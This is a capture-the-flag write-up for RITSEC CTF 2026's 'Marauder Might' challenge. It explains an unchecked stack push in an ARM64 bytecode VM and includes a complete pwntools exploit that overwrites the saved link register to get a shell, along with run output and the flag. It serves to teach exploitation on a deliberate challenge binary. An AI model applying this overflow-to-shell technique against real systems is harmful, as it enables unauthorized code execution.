# Marauder Might - RITSEC CTF 2026 write up

## 1. TL;DR
**Marauder Might** is an `aarch64` (ARM64) binary that implements a custom bytecode interpreter (Virtual Machine). The VM maintains its own internal "stack" using a fixed-size 2048-byte local array. Because the `OP_CONSTANT` instruction lacks bounds checking, pushing more than 256 elements overflows the local array, allowing us to overwrite the ARM64 saved Link Register (`x30`). We exploit this to redirect execution to an uncalled, built-in `win` function that executes `system("/bin/sh")`.

## 2. What Data/File We Have & What is Special
We are provided with a single binary file: `fractured_ship`.

*   **Architecture:** `aarch64` (64-bit ARM). This is special because local testing requires `qemu-aarch64-static` or an ARM-based machine, making dynamic debugging slightly more tedious.
*   **Linkage:** Statically linked.
*   **Protections:** No PIE (Base `0x400000`), No Stack Canary, NX Enabled, Partial RELRO.

**Interactive Behavior:**
When connecting to the server, the binary immediately outputs a single prompt:
```text
interpreting
```
It then hangs, waiting for binary bytecode payload. It expects a specific structure: a constant table followed by a stream of opcodes. 

## 3. Problem Analysis (In Detail)
By decompiling the binary in Ghidra, we quickly noticed a large dispatcher loop typical of a virtual machine (`FUN_00400890`).

**The VM Stack Initialization:**
```c
void FUN_00400890(void) {
  // ...
  undefined1 auStack_810 [2048]; // VM Stack (2048 bytes = 256 qwords)
  
  DAT_004a1968 = auStack_810;    // DAT_004a1968 acts as the Global Stack Pointer
  // ...
```
The VM initializes a global pointer (`DAT_004a1968`) to point to a local 2048-byte buffer.

**The Vulnerability (Missing Bounds Check):**
When the VM processes `OP_CONSTANT` (Opcode `0`), it fetches an 8-byte value from the user-provided constant pool and writes it to the stack pointer, then increments it:
```c
  local_10 = *(undefined8 *)(*(long *)(DAT_004a1958 + 0x18) + (ulong)local_7 * 8);
  FUN_004007e0(local_10); // Pushes to stack
```
Inside `FUN_004007e0`:
```c
void FUN_004007e0(undefined8 param_1) {
  *DAT_004a1968 = param_1;           // Write to stack
  DAT_004a1968 = DAT_004a1968 + 1;   // Increment by 8 bytes
  return;
}
```
**Notice the flaw:** There is absolutely no check to see if the stack pointer exceeds the 2048-byte limit of `auStack_810`.

**The Target:**
During our analysis, we found an unused function at `0x400780` (`FUN_00400780`) that explicitly sets up a call to `/bin/sh`. This is our `win` function. 
```c
void FUN_00400780(void) {
  FUN_00402300("/bin/sh");
  return;
}
```

## 4. Initial Guesses / First Try
Because this is an `aarch64` binary, setting up a cross-architecture GDB session to count exact padding offsets is slow. 

**The Math:** 
The buffer is `2048` bytes long. `2048 / 8 = 256` items. 
On ARM64, local variables and callee-saved registers sit right below the saved frame pointer (`x29`) and the return address/link register (`x30`). Therefore, the distance to `x30` should be `256 + roughly 2 to 6` items.

Instead of guessing the exact layout of the compiler's stack frame, the most effective "First Try" was to write an automated "Sonar" script. We configured a python script to iterate the payload size from 250 pushes up to 280 pushes, sending the `win` address at the very end of the push chain, and immediately checking if it popped a shell.

## 5. Exploitation Walkthrough / Flag Recovery

We structure our malicious bytecode payload as follows:
1. **Header:** Tell the VM we have `2` constants.
2. **Constant Pool:** 
   * Index 0: `0x0000000000000000` (Padding value)
   * Index 1: `0x0000000000400780` (Address of the `win` function)
3. **Bytecode Stream:**
   * Run `OP_CONSTANT 0` (push 0) `n-1` times to fill the VM stack and overwrite local variables and `x29`.
   * Run `OP_CONSTANT 1` to push the `win` address exactly over `x30`.
   * Run `OP_CONSTANT 0` once more as a dummy value.
   * Run `OP_RETURN` (Opcode `1`). This tells the VM loop to cleanly pop the dummy value, break out of the evaluation loop, and hit the standard C `return` instruction—popping our injected address into the instruction pointer!

**The Exploit Script:**
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'aarch64'

def try_pushes(n):
    r = remote('marauder-might.ctf.ritsec.club', 1739, level='error')
    r.recvuntil(b'interpreting\n')
    
    # 1. Number of constants
    payload = p32(2)
    
    # 2. Constants array
    payload += p64(0)         # Constant 0: padding
    payload += p64(0x400780)  # Constant 1: win() address
    
    # 3. Bytecode instructions
    for _ in range(n - 1):
        payload += p8(0) + p8(0) # OP_CONSTANT, index 0
    
    payload += p8(0) + p8(1)     # OP_CONSTANT, index 1 (Target x30 overwrite)
    payload += p8(0) + p8(0)     # Dummy value for OP_RETURN to pop
    payload += p8(1)             # OP_RETURN
    
    r.send(payload)
    
    try:
        r.recvline(timeout=2) # Ignore normal OP_RETURN print
        r.sendline(b'echo Pwned; cat flag.txt; id')
        
        out = r.recvline(timeout=2)
        if b'Pwned' in out or b'RS{' in out:
            print(f"\n[+] SUCCESS! The exact stack offset is {n} pushes.")
            print(out.decode())
            r.interactive()
            return True
    except:
        pass
    finally:
        r.close()
    return False

print("[*] Starting brute-force for the VM stack overflow offset...")
for i in range(250, 280):
    print(f"[*] Trying {i} pushes...", end='\r')
    if try_pushes(i):
        break
```

**Execution Output:**
```text
└─$ python3 solve.py
[*] Starting brute-force for the VM stack overflow offset...
[*] Trying 260 pushes...
[+] SUCCESS! The exact stack offset is 260 pushes.
Pwned

RS{th3_G4rc1a_0F_gr4pp1in6}
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
```
The exact offset turned out to be **260 pushes**.
*(Math breakdown: 256 pushes filled the buffer, 2 pushes overwrote alignment/locals, 1 push overwrote the `x29` frame pointer, and the 260th push perfectly overwrote the `x30` link register).*

## 6. What We Learned
* **VM Escapes can be classic Pwns:** You don't always need to reverse-engineer a complex logic bug or type confusion to escape a custom virtual machine. Sometimes, the VM simply uses unsafe C constructs (like a missing bounds check on a local stack array) that devolve into a standard buffer overflow.
* **Brute-forcing > Cross-Arch Debugging:** When dealing with foreign architectures like `aarch64` where finding the exact padding offset manually with GDB/QEMU is time-consuming, writing a quick script to dynamically scan for the offset via standard interaction (Fail Fast / Probe) is often much faster and highly effective.
* **ARM64 Calling Conventions:** Unlike `x86_64` which pushes the return address to the stack using the `call` instruction implicitly, ARM64 stores the return address in the Link Register (`x30`). During function prologues, `x30` is manually saved to the stack (usually right next to the Frame Pointer `x29`), making it vulnerable to the exact same buffer overflow techniques.